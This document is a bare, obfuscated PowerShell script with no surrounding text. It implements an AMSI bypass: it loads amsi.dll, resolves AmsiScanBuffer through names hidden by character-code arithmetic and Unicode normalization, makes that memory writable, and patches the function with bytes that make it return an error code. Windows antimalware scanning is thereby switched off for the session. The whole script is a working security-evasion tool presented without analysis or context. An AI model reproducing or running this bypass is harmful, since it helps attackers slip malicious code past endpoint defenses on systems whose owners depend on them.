$htOHxMj0ljqmsIcRIr = @"
using System;
using System.Runtime.InteropServices;
public class htOHxMj0ljqmsIcRIr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr xHFj4H_HuA_Wj, string P8pk);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr x0CAy, UIntPtr buMh3m, uint DrMh3JI2, out uint Uq9jculZ13U65hvPP);
}
"@

Add-Type $htOHxMj0ljqmsIcRIr

$JPecl = [htOHxMj0ljqmsIcRIr]::LoadLibrary("$([ChaR]([byTE]0x61)+[chAr](109*27/27)+[chaR]([BYTE]0x73)+[ChAR]([BYtE]0x69)+[ChAR](46*6/6)+[cHaR]([bYTE]0x64)+[chAR](56+52)+[cHAR]([byTE]0x6c))")
$RPHJSD4ZiJ5BS4gdPLI = [htOHxMj0ljqmsIcRIr]::GetProcAddress($JPecl, "$(('Àm'+'sí'+'Sc'+'ãn'+'Bû'+'ff'+'èr').NoRMalizE([chAr]([BYte]0x46)+[ChAr](111*81/81)+[char]([bYte]0x72)+[cHar](76+33)+[cHaR]([byte]0x44)) -replace [chAR]([byTe]0x5c)+[char](112*50/50)+[chaR]([BYTe]0x7b)+[cHAR](77)+[cHar]([Byte]0x6e)+[CHar]([bYTE]0x7d))")
$p = 0
[htOHxMj0ljqmsIcRIr]::VirtualProtect($RPHJSD4ZiJ5BS4gdPLI, [uint32]5, 0x40, [ref]$p)
$BuWoinbNekiBfb0O3wG = "0xB8"
$F8yMCuMq0hnTBe8W = "0x57"
$fKDRsd = "0x00"
$vS_ = "0x07"
$NteXneqbPejt = "0x80"
$BCgpo2IGsLGAApzuwFkV = "0xC3"
$HzZ = [Byte[]] ($BuWoinbNekiBfb0O3wG,$F8yMCuMq0hnTBe8W,$fKDRsd,$vS_,+$NteXneqbPejt,+$BCgpo2IGsLGAApzuwFkV)
[System.Runtime.InteropServices.Marshal]::Copy($HzZ, 0, $RPHJSD4ZiJ5BS4gdPLI, 6)